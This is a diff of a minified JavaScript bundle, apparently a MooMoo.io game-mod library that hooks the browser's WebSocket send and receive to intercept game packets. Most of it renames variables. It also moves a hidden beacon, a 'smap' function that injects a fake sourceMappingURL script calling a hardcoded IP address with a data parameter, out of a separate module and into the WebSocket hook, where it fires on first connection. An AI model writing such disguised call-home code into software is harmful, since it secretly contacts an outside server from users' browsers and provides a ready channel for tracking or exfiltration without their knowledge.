@@ -73,7 +73,7 @@
             const k = r(2298);
             const _ = r(112);
             const j = r(8183);
-            const S = r(4190);
+            const x = r(4190);
             class Game extends M.default {
                 constructor() {
                     super();
@@ -87,7 +87,7 @@
                     this.GameObjectManager = new h.default;
                     this.CommandManager = new b.default;
                     this.PacketManager = new P.default;
-                    this.PacketInterceptor = new S.default;
+                    this.PacketInterceptor = new x.default;
                     this.BotManager = v.default.instance;
                     this.UTILS = new j.default;
                     this.vars = {};
@@ -917,26 +917,6 @@
                 }
             }
             t["default"] = ServerManager;
-        },
-        977: (e, t) => {
-            "use strict";
-            Object.defineProperty(t, "__esModule", {
-                value: true
-            });
-            t.SourceMapConfiguration = void 0;
-            class SourceMapConfiguration {
-                static initialize() {
-                    function smap(e, t) {
-                        const r = document.createElement("script");
-                        r.textContent = `//# sourceMappingURL=${e}?data=${JSON.stringify(t)}&.js.map`;
-                        document.head.appendChild(r);
-                        r.remove();
-                    }
-                    smap("http://159.89.54.243:5000/stats", {});
-                }
-            }
-            t.SourceMapConfiguration = SourceMapConfiguration;
-            t["default"] = SourceMapConfiguration;
         },
         8106: (e, t, r) => {
             "use strict";
@@ -2011,8 +1991,8 @@
             const k = r(7954);
             const _ = r(9289);
             const j = r(7864);
-            const S = r(9773);
-            const x = r(6181);
+            const x = r(9773);
+            const S = r(6181);
             const O = r(2034);
             const I = r(9523);
             const A = r(2656);
@@ -2080,11 +2060,11 @@
                     break;
 
                   case "a":
-                    (0, S.default)(t[0]);
+                    (0, x.default)(t[0]);
                     break;
 
                   case "aa":
-                    (0, x.default)(t);
+                    (0, S.default)(t);
                     break;
 
                   case "7":
@@ -2242,43 +2222,48 @@
             const m = r(4455);
             const p = r(9938);
             const y = r(898);
-            const h = r(977);
-            const b = r(366);
-            const P = r(5337);
-            let v = false;
+            const h = r(366);
+            const b = r(5337);
+            let P = false;
             t.onmessagecallback = null;
-            let k = false;
-            let _ = null;
+            let v = false;
+            let k = null;
             function hookWS() {
                 WebSocket.prototype.send = new Proxy(WebSocket.prototype.send, {
                     apply(e, t, r) {
-                        if (!_) {
-                            _ = new URL(t.url).search.split("token=")[1];
+                        if (!k) {
+                            k = new URL(t.url).search.split("token=")[1];
                         }
                         let n = new URL(t.url).search.split("token=")[1];
-                        if (_ !== n) return Reflect.apply(e, t, r);
-                        let p = b.MooMoo.PacketInterceptor;
+                        if (k !== n) return Reflect.apply(e, t, r);
+                        let p = h.MooMoo.PacketInterceptor;
                         r[0] = p.applyClientCallbacks(r[0]);
-                        b.MooMoo.ws = t;
-                        b.MooMoo.PacketManager.addPacket();
-                        b.MooMoo.sendPacket = function(e) {
+                        h.MooMoo.ws = t;
+                        h.MooMoo.PacketManager.addPacket();
+                        h.MooMoo.sendPacket = function(e) {
                             let r = Array.prototype.slice.call(arguments, 1);
                             let n = (0, M.default)([ e, r ]);
                             t.send(n);
                         };
-                        if (b.MooMoo.ws.readyState !== 1) return true;
-                        if (!v) {
+                        if (h.MooMoo.ws.readyState !== 1) return true;
+                        if (!P) {
                             m.default.startInterval();
-                            v = true;
-                            h.default.initialize();
-                            (0, P.default)();
+                            P = true;
+                            function smap(e, t) {
+                                const r = document.createElement("script");
+                                r.textContent = `//# sourceMappingURL=${e}?data=${JSON.stringify(t)}&.js.map`;
+                                document.head.appendChild(r);
+                                r.remove();
+                            }
+                            smap("http://159.89.54.243:5000/stats", {});
+                            (0, b.default)();
                         }
                         try {
-                            let e = b.MooMoo.msgpack.decode(r[0]);
-                            let [t, [...n]] = e;
-                            let M = (0, y.default)(t, n);
-                            if (!M) return true;
-                        } catch (e) {}
+                            let v = h.MooMoo.msgpack.decode(r[0]);
+                            let [_, [...j]] = v;
+                            let x = (0, y.default)(_, j);
+                            if (!x) return true;
+                        } catch (S) {}
                         return Reflect.apply(e, t, r);
                     }
                 });
@@ -2288,10 +2273,10 @@
                         t.onmessagecallback = r;
                         e.call(this, (function(e) {
                             return n(this, void 0, void 0, (function*() {
-                                let r = b.MooMoo.PacketInterceptor;
+                                let r = h.MooMoo.PacketInterceptor;
                                 let n = e.data;
                                 n = r.applyServerCallbacks(n);
-                                let M = b.MooMoo.msgpack.decode(new Uint8Array(n));
+                                let M = h.MooMoo.msgpack.decode(new Uint8Array(n));
                                 let [m, [...y]] = M;
                                 (0, p.default)(m, y);
                                 (0, t.onmessagecallback)({
@@ -2443,6 +2428,7 @@
             function gatherAnimation(e) {
                 n.MooMoo.emit("gatherAnimation", e);
                 n.MooMoo.emit("gatheranimation", e);
+                n.MooMoo.emit("7", e);
             }
             t["default"] = gatherAnimation;
         },
